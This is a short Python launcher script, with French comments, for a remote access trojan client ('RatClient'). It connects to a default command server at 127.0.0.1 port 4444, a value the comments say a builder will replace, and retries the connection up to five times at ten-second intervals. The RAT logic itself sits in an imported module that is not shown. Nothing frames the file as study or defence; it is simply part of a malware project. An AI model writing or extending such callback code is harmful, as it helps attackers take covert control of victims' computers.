import sys
import time
import os

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

sys.path.insert(0, os.path.dirname(__file__))
from rat_client import RatClient

def main():
    # config par defaut - sera remplacee par le builder
    server_host = "127.0.0.1"  
    server_port = 4444
    
    print(f"[*] Tentative de connexion a {server_host}:{server_port}")
    
    client = RatClient(server_host, server_port)
    
    # boucle de reconnexion
    max_retries = 5
    retry_count = 0
    
    while retry_count < max_retries:
        try:
            client.start()
            break  # connexion reussie
        except Exception as e:
            retry_count += 1
            print(f"[-] Echec connexion (tentative {retry_count}/{max_retries})")
            if retry_count < max_retries:
                time.sleep(10)  # attend 10sec avant retry
            
    if retry_count >= max_retries:
        print("[-] Impossible de se connecter au serveur")

if __name__ == "__main__":
    main()